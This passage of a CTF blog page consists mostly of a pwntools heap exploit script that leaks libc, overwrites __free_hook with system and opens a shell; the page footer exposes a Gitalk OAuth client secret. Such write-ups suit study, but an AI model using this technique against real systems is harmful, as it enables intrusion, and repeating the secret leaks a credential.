    sh.sendline(&#39;2&#39;)
    sh.recvuntil(&#39;debuff :\n&#39;)
    sh.sendline(str(index))
    sh.recvuntil(&#39;&gt;\n&#39;)
def show(index):
    sh.sendline(&#39;3&#39;)
    sh.recvuntil(&#39;blessing :\n&#39;)
    sh.sendline(str(index))
    data = sh.recvuntil(&#39;1.add&#39;,drop=True)
    sh.recvuntil(&#39;&gt;\n&#39;)
    return data

add(0x1000,&#39;a&#39;) #0
for i in range(7): # 1-7
    add(0x28,&#39;a&#39;)
for i in range(7): # 8-14
    add(0x18,&#39;a&#39;) 
add(0x5b20,&#39;gap&#39;) #15
add(0x5e0,&#39;tot&#39;)  #16
add(0x18,&#39;zz&#39;) #17
delete(16)
add(0x618,&#39;z&#39;) #16
add(0x28,b&#39;a&#39; * 8 + p64(0xe1) + p8(0x90)) #18 0

add(0x28,&#39;a&#39;) #19 1
add(0x28,&#39;a&#39;) #20 2
add(0x28,&#39;a&#39;) #21 3
add(0x28,&#39;a&#39;) #22 4
for i in range(7):
    delete(i+1)

delete(19) #1 
delete(21) #3

for i in range(7):
    add(0x28,&#39;a&#39;) #8-14
add(0x618,&#39;19&#39;) #19

add(0x28,b&#39;b&#39;*8 + p8(0x10)) #3 21
add(0x28,&#39;1&#39;) #1 23

for i in range(7):
    delete(i+1)
delete(22) #4
delete(18) #0



for i in range(7):
    add(0x28,&#39;a&#39;) #8-14

add(0x28,p8(0x10)) #0
add(0x28,b&#39;c&#39; * 0x20+p64(0xe0)) #4
add(0x4f8,&#39;a&#39;) #24
delete(24)
add(0x18,&#39;24&#39;)
libc_base = u64(show(23).ljust(8,b&#39;\x00&#39;))- 0x1EBBE0
log.success(&quot;libc_base = &quot; + hex(libc_base)) 
libc.address = libc_base
system = libc.symbols[&#39;system&#39;]
free_hook = libc.symbols[&#39;__free_hook&#39;]

add(0x8,&#39;qqqqq&#39;)
add(0x38,b&#39;a&#39;*8 + p64(0x31))
delete(1)
delete(20)
delete(26)
add(0x38,p64(0) + p64(0x31) + p64(free_hook))
add(0x28,&#39;/bin/sh\x00&#39;)
add(0x28,p64(system))
sh.sendline(&#39;2&#39;)
sh.sendline(&#39;20&#39;)
# gdb.attach(sh,&#39;b * $rebase(0x16da)&#39;)
sh.interactive()</code></pre>

  </article>
  
    

  
  <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'nexmoe.github.io',
        owner: 'nexmoe',
        admin: 'nexmoe'
    })
    gitalk.render('gitalk')
</script>
</section>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
 
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


 
    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1637381239145"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>




  





</body>

</html>
